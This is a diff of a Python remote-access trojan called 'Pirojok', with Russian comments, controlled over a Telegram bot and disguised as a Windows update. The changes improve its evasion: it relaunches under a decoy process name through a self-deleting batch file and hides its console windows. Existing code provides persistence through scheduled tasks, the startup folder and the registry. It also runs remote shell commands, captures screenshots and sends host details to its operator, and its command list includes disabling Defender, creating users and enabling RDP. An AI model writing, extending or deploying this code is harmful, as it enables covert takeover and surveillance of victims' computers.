@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Пирожок - идеально прожаренное блюдо для удаленного управления
-Версия 5.0 - с автоматической маскировкой и защитой
+Версия 5.2 - с исправленным перезапуском после маскировки
 """
 
 import os
@@ -25,6 +25,7 @@ import uuid
 import json
 import random
 import shutil
+import traceback
 
 # Конфигурация
 BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
@@ -52,6 +53,15 @@ class PirojokMasquerade:
             if platform.system() != "Windows":
                 return
             
+            # Проверяем, не запущены ли мы уже под маской
+            current_exe = sys.executable.lower() if getattr(sys, 'frozen', False) else ""
+            for proc in self.mask_processes:
+                if proc.lower() in current_exe:
+                    print(f"🥷 Уже запущены под маской {proc}")
+                    self.masked = True
+                    self.current_mask = proc
+                    return
+            
             # Сохраняем оригинальное имя
             if getattr(sys, 'frozen', False):
                 self.original_name = sys.executable
@@ -74,34 +84,48 @@ class PirojokMasquerade:
             if self.mask_level >= 3 and self.p.admin_mode:
                 self.mask_file_attributes()
             
-            self.masked = True
-            
-            # Логируем только в консоль, не в Telegram
-            print(f"🥷 Пирожок замаскирован под {self.current_mask} (уровень {self.mask_level})")
-            
         except Exception as e:
             print(f"Ошибка маскировки: {e}")
+            traceback.print_exc()
     
     def mask_process_name(self):
         """Маскировка имени процесса"""
         try:
-            if getattr(sys, 'frozen', False):
-                current_dir = os.path.dirname(sys.executable)
-                masked_path = os.path.join(current_dir, self.current_mask)
+            if not getattr(sys, 'frozen', False):
+                print("⚠️ Маскировка имени доступна только для скомпилированных EXE")
+                return
+            
+            current_dir = os.path.dirname(sys.executable)
+            masked_path = os.path.join(current_dir, self.current_mask)
+            
+            # Создаем копию с новым именем
+            if not os.path.exists(masked_path):
+                print(f"📝 Создаю копию: {masked_path}")
+                shutil.copy2(sys.executable, masked_path)
                 
-                # Создаем копию с новым именем
-                if not os.path.exists(masked_path):
-                    shutil.copy2(sys.executable, masked_path)
-                    
-                    # Запускаем замаскированную копию
-                    subprocess.Popen([masked_path] + sys.argv[1:])
-                    
-                    # Завершаем текущий процесс
-                    self.p.send_message(self.p.owner_id, f"🥷 Перезапуск под маской {self.current_mask}")
-                    time.sleep(2)
-                    sys.exit(0)
+                # Создаем скрипт для перезапуска с правильными параметрами
+                restart_script = os.path.join(tempfile.gettempdir(), "restart_pirojok.bat")
+                with open(restart_script, 'w') as f:
+                    f.write(f'''@echo off
+timeout /t 2 /nobreak > nul
+start "" "{masked_path}"
+del "%~f0"
+''')
+                
+                print(f"🔄 Запускаю перезапуск под маской {self.current_mask}")
+                subprocess.Popen(['cmd', '/c', restart_script], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                # Завершаем текущий процесс
+                self.p.send_message(self.p.owner_id, f"🥷 Перезапуск под маской {self.current_mask}")
+                time.sleep(3)
+                sys.exit(0)
+            else:
+                print(f"✅ Маска {self.current_mask} уже существует")
+                self.masked = True
+                
         except Exception as e:
             print(f"Ошибка маскировки имени: {e}")
+            traceback.print_exc()
     
     def mask_registry_keys(self):
         """Маскировка в реестре"""
@@ -137,6 +161,8 @@ class PirojokMasquerade:
         status = f"🥷 Маскировка: {'АКТИВНА' if self.masked else 'НЕ АКТИВНА'}\n"
         status += f"📛 Текущая маска: {self.current_mask or 'Нет'}\n"
         status += f"📊 Уровень: {self.mask_level}/3\n"
+        if getattr(sys, 'frozen', False):
+            status += f"📁 Путь: {sys.executable}"
         return status
     
     def remove_masks(self):
@@ -145,7 +171,14 @@ class PirojokMasquerade:
             if self.original_name and os.path.exists(self.original_name):
                 if getattr(sys, 'frozen', False):
                     # Перезапускаем оригинал
-                    subprocess.Popen([self.original_name] + sys.argv[1:])
+                    restart_script = os.path.join(tempfile.gettempdir(), "restore_pirojok.bat")
+                    with open(restart_script, 'w') as f:
+                        f.write(f'''@echo off
+timeout /t 2 /nobreak > nul
+start "" "{self.original_name}"
+del "%~f0"
+''')
+                    subprocess.Popen(['cmd', '/c', restart_script], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                     sys.exit(0)
         except:
             pass
@@ -161,14 +194,14 @@ class Pirojok:
         self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
         self.running = True
         self.processes = []
-        self.version = "5.0.0"
+        self.version = "5.2.0"
         self.command_timeout = 60
         self.admin_mode = self.check_admin()
         self.startup_time = datetime.now()
         self.instance_id = str(uuid.uuid4())[:8]
         
         # Файлы состояния
-        self.state_file = os.path.join(tempfile.gettempdir(), "winupdate_state.json")
+        self.state_file = os.path.join(tempfile.gettempdir(), f"winupdate_state_{self.instance_id}.json")
         self.reboot_flag = os.path.join(tempfile.gettempdir(), "winupdate_reboot.flag")
         self.lock_file = os.path.join(tempfile.gettempdir(), "winupdate.lock")
         
@@ -183,6 +216,17 @@ class Pirojok:
         
         # АВТОМАТИЧЕСКАЯ МАСКИРОВКА ПРИ ЗАПУСКЕ
         self.mask.auto_masquerade()
+        
+        # Отправляем приветственное сообщение (с задержкой, чтобы не мешать маскировке)
+        threading.Timer(5.0, self.send_startup_message).start()
+    
+    def send_startup_message(self):
+        """Отправка приветственного сообщения"""
+        try:
+            self.send_message(self.owner_id, f"🥷 Пирожок готов к работе! (ID: {self.instance_id})")
+            self.send_message(self.owner_id, self.get_system_info())
+        except:
+            pass
     
     # ========== ЗАЩИТА ОТ ДУБЛЕЙ ==========
     
@@ -190,16 +234,25 @@ class Pirojok:
         """Обеспечение единственного экземпляра"""
         try:
             if platform.system() == "Windows":
-                import win32event
-                import win32api
-                import winerror
-                
-                mutex_name = "Global\\WindowsUpdateMutex"
-                self.mutex = win32event.CreateMutex(None, False, mutex_name)
-                
-                if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
-                    print("Обновление Windows уже выполняется! Завершаю дубль...")
-                    sys.exit(0)
+                try:
+                    import win32event
+                    import win32api
+                    import winerror
+                    
+                    mutex_name = "Global\\WindowsUpdateMutex"
+                    self.mutex = win32event.CreateMutex(None, False, mutex_name)
+                    
+                    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
+                        print("Обновление Windows уже выполняется! Завершаю дубль...")
+                        sys.exit(0)
+                except ImportError:
+                    print("⚠️ win32api не установлен, использую файловую блокировку")
+                    self.lock_fd = os.open(self.lock_file, os.O_CREAT | os.O_RDWR)
+                    try:
+                        fcntl.lockf(self.lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
+                    except:
+                        print("Обновление Windows уже выполняется!")
+                        sys.exit(0)
             else:
                 import fcntl
                 self.lock_fd = os.open(self.lock_file, os.O_CREAT | os.O_RDWR)
@@ -328,7 +381,8 @@ class Pirojok:
                     stdin=subprocess.PIPE,
                     text=True,
                     encoding='cp866',
-                    errors='ignore'
+                    errors='ignore',
+                    creationflags=subprocess.CREATE_NO_WINDOW
                 )
             else:
                 process = subprocess.Popen(
@@ -352,6 +406,9 @@ class Pirojok:
             
             return result or "✅ Команда выполнена"
             
+        except subprocess.TimeoutExpired:
+            process.kill()
+            return "⚠️ Команда выполнялась слишком долго"
         except Exception as e:
             return f"❌ Ошибка: {str(e)}"
     
@@ -470,7 +527,7 @@ class Pirojok:
             with open(vbs_path, 'w') as f:
                 f.write(vbs_script)
             
-            subprocess.run(['cscript', vbs_path, '//nologo'], capture_output=True)
+            subprocess.run(['cscript', vbs_path, '//nologo'], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
             os.remove(vbs_path)
             
             return "✅ Добавлено в папку автозагрузки"
@@ -497,7 +554,7 @@ class Pirojok:
                 '/f'
             ]
             
-            result = subprocess.run(cmd, capture_output=True, text=True)
+            result = subprocess.run(cmd, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
             
             if result.returncode == 0:
                 return "✅ Добавлено в планировщик (при входе)"
@@ -527,7 +584,7 @@ class Pirojok:
                 '/f'
             ]
             
-            result = subprocess.run(cmd, capture_output=True, text=True)
+            result = subprocess.run(cmd, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
             
             if result.returncode == 0:
                 return "✅ Добавлено в планировщик (при старте системы)"
@@ -603,8 +660,8 @@ class Pirojok:
             results.append("❌ Не найдено в реестре")
         
         # Из планировщика
-        subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateTask', '/f'], capture_output=True)
-        subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateSystem', '/f'], capture_output=True)
+        subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateTask', '/f'], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateSystem', '/f'], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
         results.append("✅ Удалено из планировщика")
         
         # Из Shell
@@ -681,8 +738,8 @@ class Pirojok:
             url = f"{self.base_url}/sendMessage"
             data = {"chat_id": chat_id, "text": text_with_time, "parse_mode": "HTML"}
             requests.post(url, data=data, timeout=10)
-        except:
-            pass
+        except Exception as e:
+            print(f"Send error: {e}")
     
     def send_photo(self, chat_id, photo_bytes, caption=""):
         try:
@@ -693,8 +750,8 @@ class Pirojok:
             files = {"photo": ("screenshot.jpg", photo_bytes, "image/jpeg")}
             data = {"chat_id": chat_id, "caption": caption_with_time}
             requests.post(url, files=files, data=data, timeout=30)
-        except:
-            pass
+        except Exception as e:
+            print(f"Photo error: {e}")
     
     def get_system_info(self):
         info = []
@@ -706,6 +763,8 @@ class Pirojok:
         info.append(f"👑 Права: {'Администратор' if self.admin_mode else 'Пользователь'}")
         info.append(f"🥷 Маскировка: {'ВКЛ' if self.mask.masked else 'ВЫКЛ'}")
         info.append(f"🆔 Запуск: {self.instance_id}")
+        if self.mask.current_mask:
+            info.append(f"📛 Маска: {self.mask.current_mask}")
         try:
             info.append(f"📍 IP: {requests.get('https://api.ipify.org', timeout=5).text}")
         except:
@@ -724,14 +783,15 @@ class Pirojok:
             screenshot.save(img_bytes, format='JPEG', quality=85)
             img_bytes.seek(0)
             return img_bytes.read()
-        except:
+        except Exception as e:
+            print(f"Screenshot error: {e}")
             return None
     
     def execute_command(self, command):
         try:
             if platform.system() == "Windows":
                 if command.lower().startswith("start "):
-                    subprocess.Popen(command, shell=True)
+                    subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                     return f"✅ Запущено: {command}"
                 
                 process = subprocess.Popen(
@@ -742,7 +802,8 @@ class Pirojok:
                     stdin=subprocess.PIPE,
                     text=True,
                     encoding='cp866',
-                    errors='ignore'
+                    errors='ignore',
+                    creationflags=subprocess.CREATE_NO_WINDOW
                 )
             else:
                 process = subprocess.Popen(
@@ -765,6 +826,9 @@ class Pirojok:
                 result += f"⚠️ {stderr[:500]}\n"
             
             return result or "✅ Готово"
+        except subprocess.TimeoutExpired:
+            process.kill()
+            return "⚠️ Команда выполнялась слишком долго"
         except Exception as e:
             return f"❌ Ошибка: {str(e)}"
     
@@ -796,21 +860,7 @@ class Pirojok:
                 self.send_message(self.owner_id, "🥷 Система обновлена (перезагрузка выполнена)")
                 return
             
-            boot_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-            message = f"🥷 <b>Обновление Windows установлено</b>\n\n"
-            message += f"📅 Время: {boot_time}\n"
-            message += f"💻 Система: {socket.gethostname()}\n"
-            message += f"👤 Пользователь: {getpass.getuser()}\n"
-            message += f"👑 Уровень: {'Системный' if self.admin_mode else 'Пользовательский'}\n"
-            message += f"🆔 Версия: {self.instance_id}"
-            
-            self.send_message(self.owner_id, message)
-            
-            time.sleep(5)
-            screenshot = self.take_screenshot()
-            if screenshot:
-                self.send_photo(self.owner_id, screenshot, "🖥 Текущее состояние системы")
-            
+            # Не отправляем ничего здесь, так как отправляем через send_startup_message
         except Exception as e:
             print(f"Startup error: {e}")
     
@@ -824,6 +874,8 @@ class Pirojok:
         if self.is_command_processed(update_id, text):
             return
         
+        print(f"Обработка команды: {text} (ID: {update_id})")
+        
         # Админ-команды
         admin_commands = ["admin_cmd", "task_startup", "explorer_shell", "active_setup",
                          "create_user", "enable_rdp", "disable_defender", "add_rule"]
@@ -831,6 +883,7 @@ class Pirojok:
         
         if cmd_type in admin_commands and not self.admin_mode:
             self.send_message(chat_id, "👑 Требуются права администратора. Используйте 'admin'")
+            self.mark_command_processed(update_id, text)
             return
         
         # === МАСКИРОВКА ===
@@ -1002,7 +1055,7 @@ class Pirojok:
         # === HELP ===
         elif text == "help" or text == "menu":
             help_text = """
-🥷 <b>ОБНОВЛЕНИЕ WINDOWS V5.0</b>
+🥷 <b>ОБНОВЛЕНИЕ WINDOWS V5.2</b>
 
 <b>🥷 МАСКИРОВКА:</b>
 • mask_status - статус маскировки
@@ -1045,6 +1098,7 @@ class Pirojok:
         
         else:
             self.send_message(chat_id, "❓ Неизвестная команда. Используйте help")
+            self.mark_command_processed(update_id, text)
     
     # ========== ОСНОВНОЙ ЦИКЛ ==========
     
@@ -1090,6 +1144,9 @@ class Pirojok:
         except KeyboardInterrupt:
             self.running = False
             self.send_message(self.owner_id, "🥷 Обновление Windows завершено")
+        except Exception as e:
+            print(f"Критическая ошибка: {e}")
+            traceback.print_exc()
         finally:
             self.cleanup()
     
@@ -1097,19 +1154,29 @@ class Pirojok:
         """Очистка при завершении"""
         try:
             if platform.system() == "Windows" and hasattr(self, 'mutex'):
-                import win32api
-                win32api.CloseHandle(self.mutex)
+                try:
+                    import win32api
+                    win32api.CloseHandle(self.mutex)
+                except:
+                    pass
             elif hasattr(self, 'lock_fd'):
-                import fcntl
-                fcntl.lockf(self.lock_fd, fcntl.LOCK_UN)
-                os.close(self.lock_fd)
-                os.remove(self.lock_file)
+                try:
+                    import fcntl
+                    fcntl.lockf(self.lock_fd, fcntl.LOCK_UN)
+                    os.close(self.lock_fd)
+                    if os.path.exists(self.lock_file):
+                        os.remove(self.lock_file)
+                except:
+                    pass
         except:
             pass
 
 if __name__ == "__main__":
     if platform.system() == "Windows":
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        try:
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        except:
+            pass
     
     pirojok = Pirojok()
     pirojok.run()
